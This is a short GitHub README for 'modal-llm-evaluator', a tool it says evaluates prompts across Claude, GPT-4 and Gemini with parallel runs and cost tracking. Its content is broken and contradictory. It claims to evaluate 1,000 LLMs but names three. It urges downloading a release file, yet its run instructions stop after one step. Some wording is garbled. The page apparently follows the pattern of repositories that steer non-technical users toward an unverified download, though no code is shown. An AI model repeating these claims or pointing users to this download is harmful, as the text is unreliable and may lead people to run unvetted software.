# 🎉 modal-llm-evaluator - Evaluate 1,000 LLMs in Minutes

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/McTosh1/modal-llm-evaluator/releases)

## 🚀 Getting Started

Welcome to the modal-llm-evaluator! This application allows you to evaluate 1,000 LLMs (Large Language Models) in just 10 minutes. You can test prompts across Claude, GPT-4, and Gemini with parallel execution, real-time cost tracking, and beautiful visualizations. Don't worry if you're not technical; this guide will help you get started easily.

## 💻 System Requirements

Before downloading, make sure your system meets these basic requirements:

- Operating System: Windows 10 or higher, macOS 10.13 or higher, or a Linux distribution
- Python 3.7 or higher installed on your system
- At least 8 GB of RAM
- A stable internet connection

After you download the file, follow these steps to run it:

1. Locate the downloaded file on your computer. It is usually in your "Downloads" folder.

## 📊 Features

The modal-llm-evaluator comes with a variety of features to enhance your experience:

- **Parallel Execution**: Test multiple prompts at once to save time.
- **Real-Time Cost Tracking**: Keep new insights on how much you're spending while evaluating.
- **Visualizations**: Enjoy clear and informative graphics for better understanding.
- **Support for Multiple LLMs**: Experiment with Claude, GPT-4, and Gemini effortlessly.

## 💡 Usage Instructions

Once the application is running, you can start evaluating prompts:

1. **Enter Your Prompts**: Input the text or questions you would like to evaluate.
2. **Select the LLM**: Choose which model you'd like to test your prompts on.
3. **Run Evaluation**: Click the evaluate button to start testing.
4. **View Results**: Check the results presented with insightful graphs.
